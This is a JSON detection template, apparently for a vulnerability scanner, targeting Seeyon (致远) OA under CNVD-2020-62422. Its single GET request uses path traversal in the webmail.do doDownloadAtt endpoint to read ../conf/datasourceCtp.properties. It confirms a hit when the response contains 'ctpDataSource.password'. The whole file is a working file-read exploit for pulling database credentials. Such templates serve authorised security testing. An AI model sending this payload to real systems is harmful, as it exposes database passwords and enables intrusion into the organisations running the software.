{
    "Name": "致远OA-cnvd-2020-62422-readfile",
    "Description": "致远OA-cnvd-2020-62422-readfile",
    "Product": "致远OA",
    "author": "chumeng",
    "Request":[
        {
        "Method": "GET",
        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
        "Uri":"/seeyon/webmail.do?method=doDownloadAtt&filename=index.jsp&filePath=../conf/datasourceCtp.properties",
        "Port":"",
        "Data":"",
        "Follow_redirects":"false",
        "Upload":{"Name": "","fileName": "","filePath": "" },
        "Response":{
        "Check_Steps":"AND",
        "Checks": [
                {
                "Operation": "contains", 
                "Key":"",
                "Value": "ctpDataSource.password"
                },
                {
                    "Operation": "contains", 
                    "Key":"",
                    "Value": "application/x-msdownload"
                    },
                 {
                "Operation": "code", 
                "Key":"",
                "Value": "200"  
                 }
        ]
        },
        "Next_decide":""
                }
]}

